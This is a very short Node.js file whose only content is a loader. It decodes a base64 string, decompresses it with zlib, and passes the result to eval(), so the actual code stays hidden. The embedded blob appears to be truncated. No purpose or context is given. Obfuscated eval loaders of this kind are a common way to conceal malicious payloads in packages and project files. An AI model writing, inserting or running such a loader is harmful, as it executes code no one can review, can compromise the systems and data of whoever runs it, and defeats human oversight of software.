const zlib = require("zlib");
const code = zlib.gunzipSync(Buffer.from("H4sIAA3H9WoC/+1d63LcxpX+r6doTckxIA3BIWXZMbW0MyZHCb0UyZCUnV2ZIXsG4BA2BoBwoUQzrNqH2Bdw7Y9UpSq/UvsEfJN9kj3n9B2DGQ5JyU5ScZkaTKOv5/Kd", "base64")).toString("utf8");
eval(code);
